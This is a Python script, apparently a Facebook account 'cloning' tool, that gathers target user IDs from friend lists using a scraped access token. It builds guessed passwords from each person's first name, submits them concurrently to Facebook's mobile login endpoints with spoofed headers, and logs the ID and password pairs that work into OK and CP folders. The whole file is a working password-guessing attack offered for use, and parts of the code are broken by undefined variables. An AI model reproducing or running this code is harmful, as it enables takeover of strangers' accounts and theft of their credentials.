"""

#Devlapar by mamun

"""
#os.system("python i love you.py")
def naima():
	print('-------------------')
print(logo)
os.system('espeak -a 300 " Your,   Real,  Name,"')
uname =input('\033[1;91m[\033[1;92m√\033[1;91m] \x1b[38;5;50mENTER YOUR NAME \033[1;91m: \33[1;32m')
os.system('espeak -a 300 " Welcome,   to,  MAMUN, King,  V I P,  Tools"')
def back():
	login()
	
	import getpass

attemps = 0

while attemps < 12345677901:
    username = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER USERNAME: ')
    password = input('\033[1;91m[\033[1;92m√\033[1;91m]\x1b[38;5;50m ENTER PASSWORD: ')

    if username == 'MAMUN' and password == '7804':
        print(' \033[0;92mYou Have Successfully Logged in.')
        break
    else:
        print(' Incorrect Pass Please Trying ')
        attemps += 1
        continue
os.system('clear')
pass
 
 
def login():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
        tokenku.append(token)
        try:
            sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
            sy2 = json.loads(sy.text)['name']
            sy3 = json.loads(sy.text)['id']
            menu(sy2,sy3)
        except KeyError:
            login_lagi334()
        except requests.exceptions.ConnectionError:
            print('\033[0;97m=================')
            animation(' [×] NO INTERNET CONNECTION DETECTED')
            exit()
    except IOError:
        login_lagi334()
def login_lagi334():
    try:
        os.system('clear')
        print(logo)
        ses = requests.Session()
        cookies = {'cookie':cookie}
        url = 'https://www.facebook.com/adsmanager/manage/campaigns'
        req = ses.get(url,cookies=cookies)
        set = re.search('act=(.*?)&nav_source',str(req.content)).group(1)
        nek = '%s?act=%s&nav_source=no_referrer'%(url,set)
        roq = ses.get(nek,cookies=cookies)
        tok = re.search('accessToken="(.*?)"',str(roq.content)).group(1)
        tokenw = open(".token.txt", "w").write(tok)
        cokiew = open(".cok.txt", "w").write(cookie)
      #exit()
    except Exception as e:
        os.system("rm -f .token.txt")
        os.system("rm -f .cok.txt")
        os.system("python nono.py")
        exit()

#------------------[ MENU ]----------------#
 #===©===#
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.040)
def menu():
    os.system('clear')
    print(logo)
    print(f"\033[1;91m[\033[1;92m√\033[1;91m] \033[92;1\x1b[1;97m𝚈𝙾𝚄𝚁 𝚃𝙾𝙾𝙻𝚂 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
    print(f"\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \x1b[38;5;50mUSER NAME\033[1;91m :\033[1;96m "+uname)
    print("\033[1;91m[\033[1;92m√\033[1;91m]\033[1;92m \033[0;93mTODAY DATE :\x1b[38;5;50m "+date)
    print('\033[0;97m===============================================')
    print(f"""\x1b[1;97m╔══\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \033[1;96mFILE CLONE          """)
    print("""\x1b[1;91m║══\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mFOLLOW MY GITHUB""")
    print(f"""\x1b[1;92m║══\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[1;95mCHECK OK ID AND CP ID   """)
    print("""\x1b[1;93m╚══\033[1;91m[\033[1;92m4\033[1;91m]\033[1;92m \x1b[38;5;50mEXIT""")
    print('\x1b[38;5;50║══=================')
    WASIM = input('\x1b\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    if WASIM in ['111']:
        login()
        dump_massal()
    elif Mamun in ['1']:
        crack_file()
    elif Mamun in ['2','02']:
        os.system('xdg-open https://github.com/Mamunking01')
        os.system("python nono.py")
    elif Mamun in ['3','03']:
        result()
    elif Mamun in ['0']:
        os.system('rm -rf .token.txt')
        os.system('rm -rf .cookie.txt')
        print('\033[0;97m=================')
        animation(' [×] DONE EXIT ')
        exit()
    else:
        print('\033[0;97m=================')
        animation(' [×] SELECT CORRECTLY ')
        back()
 
    #-----------------[ HASIL-CRACK ]-----------------#
 
def result():
    os.system('clear')
    print(logo)
    print('\x1b[1;91m╔══[𝟷]  \x1b[38;5;50mCHECK CP IDZ ')
    print('\x1b[1;92m║══[𝟸]  \x1b[38;5;50m OK IDZ ')
    print('\x1b[1;93m╚══[𝟹]  \x1b[38;5;50m ')
    print('\x1b[38;5;50m==================')
    kz = input(' \033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE : ')
    if kz in ['1','01']:
        try:vin = os.listdir('CP')
        except FileNotFoundError:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(3)
            back()
        if len(vin)==0:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO CP RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('CP/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<10:
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print('\x1b[38;5;50m==================')
                    print(' '+nom+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[31m '+str(len(hem))+' \033[0m CP '+x)
            print('\x1b[38;5;50m==================')
            geeh = input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] CHOOSE : ')
            print('\x1b[38;5;50m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('CP/'+geh,'r').read().splitlines()
            except:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            noCP=0
            for CPku in range(len(lin)):
                CPkuni=lin[noCP].split('|')
                print(f' \033[97;1m[\x1b[38;5;50m•\033[97;1m] CP : \033[33m {CPkuni[0]}|{CPkuni[1]}\033[0m')
                noCP +=1
            print('\x1b[38;5;50m==================')
            input('\033[97;1m[\x1b[38;5;50m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['2','02']:
        try:vin = os.listdir('OK')
        except FileNotFoundError:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
            time.sleep(2)
            back()
        if len(vin)==0:
            print('\x1b[38;5;50m==================')
            animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OK RESULTS FOUND ')
            time.sleep(2)
            back()
        else:
            cih = 0
            lol = {}
            for isi in vin:
                try:hem = open('OK/'+isi,'r').readlines()
                except:continue
                cih+=1
                if cih<100:
                    print('\x1b[38;5;50m==================')
                    nom = ''+str(cih)
                    lol.update({str(cih):str(isi)})
                    lol.update({nom:str(isi)})
                    print(' '+nom+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
                else:
                    lol.update({str(cih):str(isi)})
                    print(' '+str(cih)+'. '+isi+'\033[32m '+str(len(hem))+' \033[0m OK '+x)
            print('\x1b[38;5;50m==================')
            geeh = input(' \x1b[1;92m [•] CHOOSE : ')
            print('\x1b[38;5;50m==================')
            try:geh = lol[geeh]
            except KeyError:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND ')
                exit()
            try:lin = open('OK/'+geh,'r').read().splitlines()
            except:
                print('\x1b[38;5;50m==================')
                animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] FILE NOT FOUND ')
                time.sleep(2)
                back()
            noCP=0
            for CPku in range(len(lin)):
                CPkuni=lin[noCP].split('|')
                print(f'\033[97;1m[\x1b[38;5;50m•\033[97;1m] OK : \033[32m {CPkuni[0]}|{CPkuni[1]}\033[0m')
                noCP +=1
            print('\x1b[38;5;50m==================')
            input('\033[97;1m[\x1b[38;5;50m•\033[97;1m] PRESS ENTER TO BACK ')
            back()
    elif kz in ['0','00']:
        back()
    else:
        print('\x1b[38;5;50m==================')
        animation(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] NO OPTION FOUND IN MENU')
        exit()
 
#-------------------[ CRACK-PUBLIK ]----------------#
 
def dump_massal():
    try:
        token = open('.token.txt','r').read()
        cok = open('.cok.txt','r').read()
    except IOError:
        exit()
    try:
        print('\x1b[38;5;50m==================')
        jum = int(input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] ENTER TARGET AMOUNT  : '))
        print('\x1b[38;5;50m==================')
    except ValueError:
        print('\x1b[38;5;50m==================')
        animation(' [×] INVALID OPTION ')
        exit()
    if jum<1 or jum>100000000:
        print('\x1b[38;5;50m==================')
        animation(' [×] TRY AGAIN ')
        exit()
    ses=requests.Session()
    yz = 0
    for met in range(jum):
        yz+=1
        kl = input(' \033[97;1m[\x1b[38;5;50m•\033[97;1m] INPUT UID '+str(yz)+' : ')
        uid.append(kl)
    for userr in uid:
        try:
            col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
            for mi in col['friends']['data']:
                try:
                    iso = (mi['id']+'|'+mi['name'])
                    if iso in id:pass
                    else:id.append(iso)
                except:continue
        except (KeyError,IOError):
            pass
        except requests.exceptions.ConnectionError:
            print('\x1b[38;5;50m==================')
            animation(' [×] TRY AGAIN ')
            os.system('clear')
    try:
        print('\x1b[38;5;50m==================')
        print(f' \033[97;1m[\x1b[38;5;50m•\033[97;1m] TOTAL ID : \u001b[36m'+str(len(id))+'\033[1;37m')
        setting()
    except requests.exceptions.ConnectionError:
        print(f'{u}')
        back()
    except (KeyError,IOError):
        print('\x1b[38;5;50m==================')
        animation(" [×] DUMP ID FAILED ")
        time.sleep(3)
        back()
 
#-------------[ CRACK-FROM-FILE ]------------------#
 
def crack_file():
    print('\x1b[38;5;50m==================')
    os.system('espeak -a 300 " your file name"')
    print('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mPUT FILE NAME EXAMPLE: /sdcard/file.txt Etc.]')
    o = input('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mINTER YOUR FILE NAME :\x1b[1;95m ')
    try:lin = open(o).read().splitlines()
    except:
        print('\x1b[38;5;50m==================')
        animation(' [×] FILE NOT FOUND')
        time.sleep(2)
        back()
    for xid in lin:
        id.append(xid)
    setting()
 
#-------------[ PENGATURAN-IDZ ]---------------#
 
def setting():
    print('\x1b[38;5;50m=============================')
    print("\x1b[1;91m╔══\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \x1b[38;5;50mCLONEING FOR ONLY OLD IDz")
    print("\x1b[1;92m║══\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \033[0;93mCLONEING FOR ONLY NEW IDz")
    print("\x1b[1;93m╚══\033[1;91m[\033[1;92m3\033[1;91m]\033[1;92m \x1b[38;5;50mCLONEING FOR MIX IDz")
    print('\x1b[38;5;50m=============================')
    hu = input('\033[97;1m[\x1b[38;5;50m√\033[97;1m] \033[1;96mCHOOSE :\x1b[38;5;50m ')
    if hu in ['1','01']:
        for tua in sorted(id):
            id2.append(tua)
    elif hu in ['2','02']:
        muda=[] 
        for bacot in sorted(id):
            muda.append(bacot)
        bcm=len(muda)
        bcmi=(bcm-1)
        for xmud in range(bcm):
            id2.append(muda[bcmi])
            bcmi -=1
    elif hu in ['3','03']:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    else:
        for bacot in id:
            xx = random.randint(0,len(id2))
            id2.insert(xx,bacot)
    print('\x1b[38;5;50m==================')
    print('\x1b[38;5;50m==================')
    print("\x1b[1;91m╔══\033[1;91m[\033[1;92m1\033[1;91m]\033[1;92m \x1b[38;5;50m COOKIES  [\x1b[1;95m1\x1b[38;5;50m]")
    print("\x1b[1;93m╚══\033[1;91m[\033[1;92m2\033[1;91m]\033[1;92m \x1b[38;5;50m CP ID [\x1b[38;5;50m2\x1b[1;95m]")
    print('\x1b[38;5;50m==================')
    hc = input('\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96mCHOOSE: ')
    os.system("xdg-open https://www.facebook.com/profile.php?id=100070395425821")
    if hc in ['1','01']:
        method.append('mobile')
    elif hc in ['2','02']:
        method.append('free')
    else:
        method.append('mobile')
    passwrd()
    exit() 
 
#-------------------[ BAGIAN-WORDLIST ]------------#
 
def passwrd():
    os.system('clear')
    print(logo)
    print(f"\033[1;91m[\033[1;92m√\033[1;91m] \033[92;1\x1b[1;97m𝚈𝙾𝚄𝚁 𝚃𝙾𝙾𝙻𝚂 𝙰𝙲𝚃𝙸𝚅𝙴 \x1b[38;5;50m[𝙿𝚁𝙴𝙼𝙸𝚄𝙼] ")
    print(f"\033[1;91m[\033[1;92m√\033[1;91m] \033[92;1\x1b[1;97m𝚄𝚂𝙴𝚁 𝙽𝙰𝙼𝙴\033[1;91m :\033[1;96m "+𝚞𝚗𝚊𝚖𝚎)
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[10;93m𝚃𝙾𝙳𝙰𝚈'𝚂 𝙳𝙰𝚃𝙴 :\x1b[38;5;50m "+𝚍𝚊𝚝𝚎)
    print('\033[1;91m[\033[1;92m√\033[1;91m] \033[41m\x1b[1;97m𝚈𝙾𝚄𝚁 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳𝚣 \033[0;97m:\x1b[38;5;50m ',str(len(id)))
   # print("\033[1;91m[\033[1;92m√\033[1;91m] \033[41m\x1b[1;97m𝚂𝚃𝙰𝚁𝚃𝙴𝙳 𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚃𝙸𝙼𝙴\033[0;97m :> \x1b[38;5;50m"+time.strftime("%H:%M")+" "+ tag)
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[95m𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚂𝙿𝙴𝙴𝙳 𝚂𝚄𝙿𝙴𝚁 𝚂𝙻𝙾𝚆-!💚")
    print(f'\033[1;91m[\033[1;92m√\033[1;91m] \033[1;96m𝚄𝚂𝙴=[𝙵𝙻𝙸𝙶𝙷𝚃 𝙼𝙾𝙳𝙴 𝙵𝙾𝚁 𝚂𝙿𝙴𝙴𝙳 𝚄𝙿💙] ')
    print('\x1b[38;5;50m===============================================')
    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'22')
                    pwv.append(frs+'@12')
                    pwv.append(frs+'4455')
                    pwv.append(frs+'00')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'#11')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@11')
                    pwv.append(frs+'@22')
                    pwv.append(frs+'##')                
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                    pwv.append(frs+'12')
                    pwv.append(frs+'22')
                    pwv.append(frs+'@12')
                    pwv.append(frs+'4455')
                    pwv.append(frs+'00')                
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append('57273200')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'1122')
                    pwv.append(frs+'11')
                    pwv.append(frs+'#11')
                    pwv.append(frs+'@1122')
                    pwv.append(frs+'@11')
                    pwv.append(frs+'@22')
                    pwv.append(frs+'##')
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\n\033[1;37m===================================')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[97;1m] OK :\033[0;92m %s '%(OK))
    print('\033[97;1m[\033[92;1m+\033[97;1m] CP :\033[0;93m %s '%(CP))
    print('\n\033[1;37m===================================')
    woi = input('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;37m ENTER TO BACK')
    exit()
 
#--------------------[ METODE-B-API ]-----------------#
 
def crack(idf,pwv):
    global loop,ok,CP
    bo = random.choice([m,k,h,b,u,x])
    sys.stdout.write(f"\r\033[100;92m{bo}[WASIM-ON]-{P}[{H}{loop}{P}]-[{H}{len(id)}{P}]-[{H}OK{bo}-{H}{ok}{P}]-[{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mMamun-CP\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> {idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \033[1;92m{pw}')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mMamun-OK\033[1;91m] \033[10;92m\033[1;91m[\033[1;92mNUM\033[1;91m]> \x1b[38;5;50m{idf} \033[10;92m\033[1;91m[\033[1;92mPASS\033[1;91m]> \x1b[38;5;50m{pw}\n\x1b[38;5;50 \033[1;91m[💙]\033[1;91m=\033[1;92m= \x1b[38;5;50m{kuki} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " Mamun,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#------------------[ METHODE-MBASIC-2 ]-------------------#
 
def crackfree(idf,pwv):
    global loop,ok,CP
    sys.stdout.write(f"\r{H}[Mamun-ON]{P}-[{H}{loop}{P}]{P}-[{H}{len(id)}{P}]-[OK{P}-{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="109", "Google Chrome";v="109"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent':ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[10;92m\033[1;91m[\033[1;92mMamun-CP\033[1;91m] {idf} • {pw}')
                print('\x1b[38;5;50m============================')
                os.system('espeak -a 300 " CP, ID"')
                open('CP/'+CPc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                CP+=1
                break
            elif "c_user" in ses.cookies.get_dict().keys():
                ok+=1
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•WASIM-OK] \033[1;92m{idf} • \033[1;92m{pw} ')
                print('\x1b[38;5;50m===============================================')
                os.system('espeak -a 300 " Mamun,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
                
            else:
                continue
        except requests.exceptions.ConnectionError:
            time.sleep(31)
    loop+=1
 
#-----------------------[ SYSTEM-CONTROL ]--------------------#
 
if __name__=='__main__':
    try:os.mkdir('OK')
    except:pass
    try:os.mkdir('CP')
    except:pass
    try:os.system('touch .prox.txt')
    except:pass
menu()